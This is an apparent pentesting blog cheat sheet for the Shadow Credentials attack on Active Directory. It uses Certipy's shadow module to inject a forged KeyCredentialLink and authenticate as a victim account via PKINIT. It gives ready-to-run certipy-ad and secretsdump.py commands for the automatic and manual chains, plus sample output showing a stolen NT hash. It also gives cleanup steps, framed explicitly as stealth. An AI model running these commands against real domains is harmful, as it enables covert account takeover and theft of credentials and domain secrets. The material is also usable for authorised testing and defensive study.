---
title: "Certipy Shadow Credentials (KeyCredentialLink Abuse)"
description: "Covert lateral movement by injecting shadow credentials into a target user's object."
date: 2025-06-10T10:00:00+05:30
categories:
  - hacking
  - windows
tags:
  - foothold
  - windows
  - active directory
  - pentesting
  - shadow
---

Shadow Credentials are a stealthy method of impersonating users in Active Directory environments by injecting a forged certificate identity into the target account’s `msDS-KeyCredentialLink` attribute.

This enables Smartcard logon (PKINIT) without knowing the user’s password or having their private key.

Certipy automates this attack via the `shadow` module.  

- **Target**: Any user with GenericWrite / WriteProperty / WriteDACL over another account.  
- **Vulnerability**: Abuse of msDS-KeyCredentialLink to forge a valid Smartcard identity.  
- **Impact**: Auth as victim via certificate (PKINIT), retrieve TGT, dump secrets.  
- **Restoration**: Optionally revert the modified attribute for stealth.

### You need:
- A low-priv user (attacker) with write access to the msDS-KeyCredentialLink property of a target user.
- faketime (i use timewrap, a custom bash script)

### Example
We’ll impersonate victim.user@lab.local using attacker.user@lab.local with write access.

```bash
certipy-ad shadow auto -u 'attacker.user' -p 'Winter2023!' -account 'victim.user' -target 'DC01.lab.local' -dc-ip 10.10.10.10
```
### **What `shadow auto` does:**
The auto chain performs:
1. Generate Certificate + Key
2. Create forged KeyCredential blob
3. Inject blob into msDS-KeyCredentialLink of victim
4. Authenticate as victim via PKINIT
5. Obtain TGT and NT hash
6. Restore original KeyCredentialLink (stealth)

### **Behind the scene**
Certipy will show something like:
```bash
[] Targeting user 'victim.user'
[] Generating certificate
[] Adding Key Credential...
[] Authenticating via PKINIT...
[] Got TGT
[] Dumping secrets...
[] NT hash for 'victim.user': b1bc3d70e70f4f36b1509a65ae1a2ae6
[] Restoring old KeyCredentialLink
```
> If No identities found in this certificate appears, don’t worry — the cert is still valid for PKINIT.

### **Certipy drops:**
- victim.user.pfx: Certificate and private key
- victim.user.ccache: Kerberos ticket cache (TGT)
- Hashes in terminal or victim.user.ntds (if dumped)

> Use the .pfx or .ccache for relogin.

### **Manual Variant**
1. Inject Shadow Credential
```bash
certipy-ad shadow add -u 'attacker.user' -p 'Winter2023!' -account 'victim.user' -target 'DC01.lab.local' -dc-ip 10.10.10.10
```

2. Authenticate via Certificate
```bash
export KRB5CCNAME=victim.user.ccache
certipy-ad auth -pfx victim.user.pfx -domain lab.local -username victim.user
```

3. Dump Secrets
```bash
secretsdump.py -k -no-pass lab.local/victim.user@dc01.lab.local
```

**Cleanup (Manual - removing injected blob)**
```bash
certipy-ad shadow restore -u 'attacker.user' -p 'Winter2023!' -account 'victim.user' -target 'DC01.lab.local' -dc-ip 10.10.10.10
```